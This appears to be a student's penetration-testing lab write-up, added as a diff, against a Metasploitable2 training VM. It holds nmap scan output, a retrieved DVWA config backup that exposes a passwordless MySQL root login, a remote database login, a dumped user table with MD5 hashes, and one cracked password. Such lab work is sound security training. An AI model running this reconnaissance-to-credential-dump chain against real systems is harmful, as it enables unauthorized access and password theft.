@@ -1,0 +1,150 @@
+EJ Cervantes
+Week 7
+2 OCT 2018
+
+#_______________________________________________________________________________________________________________#
+
+1) root@kali:~# ip route                                                                                 │
+10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15                                            │
+172.28.128.0/24 dev eth1 proto kernel scope link src 172.28.128.3    
+
+-No default route
+
+2)
+172.28.128.5 is metasploitable2
+
+
+ root@kali:~# nmap 172.28.128.0/24
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-02 18:15 EDT
+Nmap scan report for 172.28.128.1
+Host is up (0.000043s latency).
+All 1000 scanned ports on 172.28.128.1 are closed
+MAC Address: 0A:00:27:00:00:00 (Unknown)
+
+Nmap scan report for 172.28.128.2
+Host is up (0.000066s latency).
+All 1000 scanned ports on 172.28.128.2 are filtered
+MAC Address: 08:00:27:6C:B7:1A (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for 172.28.128.5
+Host is up (0.00028s latency).
+Not shown: 977 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6000/tcp open  X11
+6667/tcp open  irc
+8009/tcp open  ajp13
+8180/tcp open  unknown
+MAC Address: 08:00:27:27:CC:8E (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for 172.28.128.3
+Host is up (0.0000040s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 5.88 seconds
+
+3)
+a) root@kali:~# echo 172.28.128.5 metasploitable2.pen >>/etc/hosts  
+root@kali:~# ping 172.28.128.5
+PING 172.28.128.5 (172.28.128.5) 56(84) bytes of data.
+64 bytes from 172.28.128.5: icmp_seq=1 ttl=64 time=5.50 ms
+64 bytes from 172.28.128.5: icmp_seq=2 ttl=64 time=1.17 ms
+64 bytes from 172.28.128.5: icmp_seq=3 ttl=64 time=1.13 ms
+64 bytes from 172.28.128.5: icmp_seq=4 ttl=64 time=0.976 ms
+64 bytes from 172.28.128.5: icmp_seq=5 ttl=64 time=1.09 ms
+64 bytes from 172.28.128.5: icmp_seq=6 ttl=64 time=1.40 ms
+^C
+--- 172.28.128.5 ping statistics ---
+6 packets transmitted, 6 received, 0% packet loss, time 5008ms
+rtt min/avg/max/mdev = 0.976/1.879/5.501/1.625 ms
+
+4)
+a)Server: Apache/2.2.8 (Ubuntu) DAV/2
+
+
+b) PHP/5.2.4-2ubuntu5.10
+
+
+c)OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+
+5)
+a)+ OSVDB-3268: /dvwa/config/: Directory indexing found.
++ /dvwa/config/: Configuration information may be available remotely.
+
+6)
+a)
+-config.inc.php
+b)Nothing. URL is changed but blank page
+
+7)http://metasploitable2.pen/dvwa/config/config.inc.php~
+
+<?php
+
+# If you are having problems connecting to the MySQL database and all of the variables below are correct
+# try changing the 'db_server' variable from localhost to 127.0.0.1. Fixes a problem due to sockets.
+# Thanks to digininja for the fix.
+
+# Database management system to use
+
+$DBMS = 'MySQL';
+#$DBMS = 'PGSQL';
+
+# Database variables
+
+$_DVWA = array();
+$_DVWA[ 'db_server' ] = 'localhost';
+$_DVWA[ 'db_database' ] = 'dvwa';
+$_DVWA[ 'db_user' ] = 'root';
+$_DVWA[ 'db_password' ] = '';
+
+# Only needed for PGSQL
+$_DVWA[ 'db_port' ] = '5432'; 
+
+
+8)
+root@kali:~# nmap metasploitable2.pen
+3306/tcp open mysql
+
+9)
+root@kali:~# mysql -h metasploitable2.pen -u root -D dvwa
+
+a)MySQL [dvwa]> use dvwa; select * from users;
+Database changed
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+| user_id | first_name | last_name | user    | password                         | avatar                                                |
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+|       1 | admin      | admin     | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/admin.jpg   |
+|       2 | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg |
+|       3 | Hack       | Me        | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b | http://172.16.123.129/dvwa/hackable/users/1337.jpg    |
+|       4 | Pablo      | Picasso   | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 | http://172.16.123.129/dvwa/hackable/users/pablo.jpg   |
+|       5 | Bob        | Smith     | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 | http://172.16.123.129/dvwa/hackable/users/smithy.jpg  |
++---------+------------+-----------+---------+----------------------------------+-------------------------------------------------------+
+5 rows in set (0.01 sec)
+
+
+10)
+a)Gordon
+b)e99a18c428cb38d5f260853678922e03
+c)MD5
+d)abc123
